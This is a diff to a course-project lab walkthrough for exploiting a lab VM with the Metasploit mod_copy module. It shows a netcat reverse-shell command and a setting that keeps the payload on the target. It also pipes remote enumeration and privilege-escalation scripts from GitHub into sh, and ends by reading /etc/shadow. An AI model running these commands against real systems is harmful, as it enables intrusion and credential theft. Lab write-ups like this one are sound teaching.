@@ -57,7 +57,7 @@ ping 10.0.2.15
 
 ---
 
-## 2.1 Scan Victim with Nmap
+## 2.1 Scan Victim with Nmap (Terminal A)
 
 ```bash
 nmap -sV 10.0.2.15
@@ -69,10 +69,10 @@ nmap -sV 10.0.2.15
 
 ---
 
-## 2.2 Launch Metasploit Console
+## 2.2 Launch Metasploit Console (Terminal B)
 
 ```bash
-sudo msfconsole
+msfconsole
 ```
 
 **Screenshot:**
@@ -80,7 +80,7 @@ sudo msfconsole
 
 ---
 
-## 2.3 Search and Use Exploit
+## 2.3 Search and Use Exploit (Terminal B)
 
 ```bash
 search mod_copy
@@ -88,11 +88,23 @@ use 0
 ```
 
 **Screenshot:**
-- ![12-search_and_use_modcopy_exploit.png](./screenshots/12-search_and_use_modcopy_exploit.png)
+- ![12-search_modcopy_exploit.png](./screenshots/12-search-mod_copy-exploit.png)
+- ![13-select-mod_copy-exploit.png](./screenshots/113-select-mod_copy-exploit.png)
 
 ---
 
-## 2.4 Configure Exploit Options
+## 2.4 Show Exploit Options (Terminal B)
+
+```bash
+show options
+```
+
+**Screenshot:**
+- ![14-show-exploit-options.png](./screenshots/14-show-exploit-options.png)
+
+---
+
+## 2.5 Configure Exploit Options (Terminal B)
 
 ```bash
 set RHOSTS 10.0.2.15
@@ -100,47 +112,62 @@ set SITEPATH /var/www/html
 ```
 
 **Screenshot:**
-- ![13-configure_rhosts_sitepath.png](./screenshots/13-configure_rhosts_sitepath.png)
+- ![15-set-RHOST-to-victim-ip.png](./screenshots/15-set-RHOST-to-victim-ip.png)
+- ![16-set-SITEPATH-to-var-www-html.png](./screenshots/16-set-SITEPATH-to-var-www-html.png)
 
 ---
 
-## 2.5 Configure Payload and Reverse Shell Command
+## 2.6 Configure Payload and Reverse Shell Command (Terminal B)
 
 ```bash
+show payloads
 set payload 5
-set LHOST 10.0.2.6
-set LPORT 4444
+show payload options
 set CMD /tmp/mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.2.6 4444 > /tmp/f
 ```
 
 **Screenshot:**
-- ![14-set_payload_and_reverse_shell_command.png](./screenshots/14-set_payload_and_reverse_shell_command.png)
+- ![17-show-compatible-payloads.png](./screenshots/17-show-compatible-payloads.png)
+- ![18-set-generic-reverse-shell-payload.png](./screenshots/18-set-generic-reverse-shell-payload.png)
+- ![19-verify-payload-options.png](./screenshots/19-verify-payload-options.png)
+- ![20-set-CMD-netcat-reverse-shell.png](./screenshots/20-set-CMD-netcat-reverse-shell.png)
 
 ---
 
-## 2.6 Start Netcat Listener (Terminal A)
+## 2.7 Configure Exploit to Retain Payload on Target (Terminal B)
+
+```bash
+set AllowNoCleanup true
+```
+
+**Screenshot:**
+- ![21-set-AllowNoCleanup-true.png](./screenshots/21-set-AllowNoCleanup-true.png)
+
+---
+
+## 2.8 Start Netcat Listener (Terminal A)
 
 ```bash
 nc -lnvp 4444
 ```
 
 **Screenshot:**
-- ![15-start_nc_listener.png](./screenshots/15-start_nc_listener.png)
+- ![22-start-netcat-listener.png](./screenshots/22-start-netcat-listener.png)
 
 ---
 
-## 2.7 Run Exploit (Terminal B)
+## 2.9 Run Exploit (Terminal B)
 
 ```bash
 run
 ```
 
 **Screenshot:**
-- ![16-run_exploit.png](./screenshots/16-run_exploit.png)
+- ![23-run-exploit.png](./screenshots/23-run-exploit.png)
 
 ---
 
-## 2.8 Confirm Reverse Shell Access
+## 2.10 Confirm Reverse Shell Access (Terminal A)
 
 ```bash
 whoami
@@ -148,7 +175,7 @@ ls
 ```
 
 **Screenshot:**
-- ![17-confirm_shell_access.png](./screenshots/17-confirm_shell_access.png)
+- ![24-successful-reverse-shell-access.png](./screenshots/24-successful-reverse-shell-access.png)
 
 ---
 
@@ -156,25 +183,26 @@ ls
 
 ---
 
-## 3.1 Run Custom Enumeration Script (lightpeas.sh)
+## 3.1 Run Custom Enumeration Script (lightpeas.sh) (Terminal A)
 
 ```bash
 curl -fsSL https://raw.githubusercontent.com/A0-2H/ICS344-CourseProject/main/phase1/custom/lightpeas.sh | sh
 ```
 
 **Screenshot:**
-- ![18-run_lightpeas_script.png](./screenshots/18-run_lightpeas_script.png)
+- ![25-run-lightpeas-script.png](./screenshots/25-run-lightpeas-script.png)
+- ![26-lightpeas-enumeration-results.png](./screenshots/26-lightpeas-enumeration-results.png)
 
 ---
 
-## 3.2 Execute Custom Privilege Escalation (escalate.sh)
+## 3.2 Execute Custom Privilege Escalation (escalate.sh) (Terminal A)
 
 ```bash
 sh -c "$(curl -fsSL https://raw.githubusercontent.com/A0-2H/ICS344-CourseProject/main/phase1/custom/escalate.sh)"
 ```
 
 **Screenshot:**
-- ![19-run_escalate_script.png](./screenshots/19-run_escalate_script.png)
+- ![27-run-escalate-script-and-root-access.png](./screenshots/27-run-escalate-script-and-root-access.png)
 
 ---
 
@@ -186,7 +214,7 @@ cat /etc/shadow
 ```
 
 **Screenshot:**
-- ![20-confirm_root_access.png](./screenshots/20-confirm_root_access.png)
+- ![27-run-escalate-script-and-root-access.png](./screenshots/27-run-escalate-script-and-root-access.png)
 
 ---
 
